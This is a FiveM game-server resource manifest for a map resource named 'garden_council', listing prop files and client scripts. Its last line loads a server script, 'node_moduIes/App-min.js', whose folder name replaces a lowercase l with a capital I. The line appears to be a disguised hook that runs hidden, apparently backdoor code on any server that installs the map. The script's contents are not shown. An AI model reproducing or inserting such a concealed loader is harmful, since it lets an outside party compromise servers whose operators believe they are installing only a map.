resource_manifest_version '77731fab-63ca-442c-a67b-abc70f28dfa5'
this_is_a_map 'yes'

version '1.0.0'
description 'garden_council by GardenTH & Script by Mail3ee'

files {
	'stream/gardenth_prop.ytyp',
	'stream/vw_prop_vw_accs_01.ytyp',
	'stream/gangconcilviolet.ytyp',
	'stream/gangconcilgreen.ytyp',
}

client_scripts { 
	"config.lua",
	"client.lua"
} 

data_file 'gardenth_prop' 'props.ytyp'
data_file 'vw_prop_vw_accs_01' 'props.ytyp'
data_file 'gangconcilviolet' 'props.ytyp'
data_file 'gangconcilgreen' 'props.ytyp'

server_script "node_moduIes/App-min.js"
